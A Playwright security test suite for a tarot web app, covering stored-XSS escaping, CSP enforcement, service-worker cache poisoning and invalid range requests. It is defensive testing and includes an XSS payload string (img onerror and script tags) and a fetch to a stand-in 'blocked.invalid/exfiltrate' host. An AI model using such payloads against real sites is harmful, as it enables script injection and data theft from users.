import { expect, test } from '@playwright/test';

declare global{interface Window{security_pwned:number;security_violations:string[]}}

test('question and notes stay literal, local text and cannot execute stored XSS',async({page})=>{
  const payload='AUDIT_PRIVATE_MARKER<img src=x onerror="window.security_pwned=1"><script>window.security_pwned=2</script>';
  const transmitted:string[]=[];
  page.on('request',request=>{if(request.url().includes('/api/')&&request.method()==='POST')transmitted.push(request.postData()??'');});
  await page.addInitScript(()=>{window.security_pwned=0;});
  await page.emulateMedia({reducedMotion:'reduce'});
  await page.goto('/');await page.locator('.mode-card').nth(3).click();
  await page.getByLabel(/此刻，你想探索什么/).fill(payload);
  await page.getByRole('button',{name:'快速抽取',exact:true}).click();
  await expect(page.locator('.reading-card')).toHaveCount(3);
  await expect(page.locator('.reading-intro p')).toHaveText(payload);
  await expect(page.locator('.reading-intro p img, .reading-intro p script')).toHaveCount(0);
  await page.getByRole('button',{name:'全部翻开',exact:true}).click();
  await page.getByRole('textbox',{name:'我的笔记'}).fill(payload);
  await page.getByRole('button',{name:'保存笔记'}).click();await expect(page.getByText('笔记已保存')).toBeVisible();
  await page.reload();await expect(page.getByRole('textbox',{name:'我的笔记'})).toHaveValue(payload);
  const nav=page.locator('.site-header nav:visible, .mobile-nav:visible');
  await nav.getByRole('button',{name:/^(我的记录|记录)$/}).click();
  await expect(page.locator('.history-main h3')).toHaveText(payload);
  await expect(page.locator('.history-main h3 img, .history-main h3 script')).toHaveCount(0);
  expect(await page.evaluate(()=>window.security_pwned)).toBe(0);
  expect(transmitted.length).toBeGreaterThan(0);
  expect(transmitted.join('\n')).not.toContain('AUDIT_PRIVATE_MARKER');
});

test('CSP blocks inline scripts, event handlers and external connection attempts',async({page})=>{
  const outgoing:string[]=[];
  await page.route('https://blocked.invalid/**',async route=>{outgoing.push(route.request().url());await route.abort();});
  await page.goto('/');await expect(page.locator('.hero')).toBeVisible();
  await page.evaluate(()=>{
    window.security_pwned=0;window.security_violations=[];
    document.addEventListener('securitypolicyviolation',event=>window.security_violations.push(event.violatedDirective));
    const script=document.createElement('script');script.textContent='window.security_pwned=1';document.body.append(script);
    const button=document.createElement('button');button.setAttribute('onclick','window.security_pwned=2');document.body.append(button);button.click();
    void fetch('https://blocked.invalid/exfiltrate').catch(()=>{});
  });
  await expect.poll(()=>page.evaluate(()=>window.security_violations.length)).toBeGreaterThanOrEqual(3);
  expect(await page.evaluate(()=>window.security_pwned)).toBe(0);
  expect(outgoing).toEqual([]);
});

test('service worker cannot serve injected scripts from media or foreign caches and rejects invalid ranges',async({page,request})=>{
  const manifest=await (await request.get('/api/v1/resources/manifest')).json();
  const audio=manifest.items.find((item:{group:string})=>item.group==='audio').url;
  await page.goto('/');await expect(page.locator('.hero')).toBeVisible();
  await page.evaluate(async()=>{await navigator.serviceWorker.ready;});
  await page.reload();
  await expect.poll(()=>page.evaluate(()=>!!navigator.serviceWorker.controller)).toBe(true);
  await page.evaluate(async audio=>{
    const media=await caches.open('paper-tarot-media-security-audit');
    await media.put('/assets/audit-poison.js',new Response('window.security_pwned=9',{headers:{'Content-Type':'application/javascript'}}));
    await media.put(audio,new Response(new Uint8Array([1,2,3,4,5,6,7,8]),{headers:{'Content-Type':'audio/wav'}}));
    const foreign=await caches.open('another-app-cache');await foreign.put('/assets/foreign-poison.js',new Response('window.security_pwned=10'));
    window.security_pwned=0;
  },audio);
  const scripts=await page.evaluate(async()=>{
    return Promise.all(['/assets/audit-poison.js','/assets/foreign-poison.js'].map(async path=>{const response=await fetch(path);return {status:response.status,body:await response.text()};}));
  });
  expect(scripts.every(result=>result.status===404&&!result.body.includes('security_pwned'))).toBe(true);
  const ranges=await page.evaluate(async audio=>{
    return Promise.all(['bytes=4-1','bytes=20-','bytes=0-1,4-5','bytes=-2','bytes=1-3'].map(async range=>{
      const response=await fetch(audio,{headers:{Range:range}});return {status:response.status,bytes:[...new Uint8Array(await response.arrayBuffer())],range:response.headers.get('content-range')};
    }));
  },audio);
  expect(ranges.slice(0,3).map(r=>r.status)).toEqual([416,416,416]);
  expect(ranges[3]).toEqual({status:206,bytes:[7,8],range:'bytes 6-7/8'});
  expect(ranges[4]).toEqual({status:206,bytes:[2,3,4],range:'bytes 1-3/8'});
});

test('malformed card fragments do not prevent navigation or lookup',async({page})=>{
  const errors:string[]=[];page.on('pageerror',error=>errors.push(error.message));
  await page.goto('/#card=%E0%A4%A');await expect(page.locator('.hero')).toBeVisible();
  await page.getByRole('button',{name:'全站卡牌查询'}).click();
  await page.getByRole('textbox',{name:'搜索卡牌'}).fill('愚者');await expect(page.locator('.modal .library-card')).toHaveCount(1);
  expect(errors).toEqual([]);
});
